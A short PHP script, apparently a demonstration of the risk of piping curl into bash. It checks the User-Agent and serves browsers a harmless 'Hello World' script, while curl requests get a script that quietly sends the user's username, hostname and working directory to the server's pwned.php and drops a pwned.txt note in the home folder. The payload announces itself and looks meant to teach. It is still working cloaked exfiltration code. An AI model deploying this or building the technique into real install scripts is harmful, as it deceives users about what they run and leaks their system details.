<?
header('Content-Type: text/plain; charset=UTF-8');

$baseurl = ($_SERVER['REQUEST_SCHEME'] == 'http' ? 'http://' : 'https://') . $_SERVER['HTTP_HOST'];

if (str_contains(strtolower($_SERVER['HTTP_USER_AGENT']), 'curl')) {
?>
#!/bin/bash
curl -s -G \
    --data-urlencode "username=$(whoami)" \
    --data-urlencode "hostname=$(hostname)" \
    --data-urlencode "&pwd=$(pwd)" \
    "<?= $baseurl ?>/pwned.php" &> /dev/null
echo "!!! Pwned !!!" > ~/pwned.txt
echo "Take a look at <?= $baseurl ?>/pwned.txt" >> ~/pwned.txt
echo "!!! Pwned !!!"
echo "Take a look at ~/pwned.txt in your home folder."

<? } else { ?>
#!/bin/bash
echo "Hello World!"
<?}
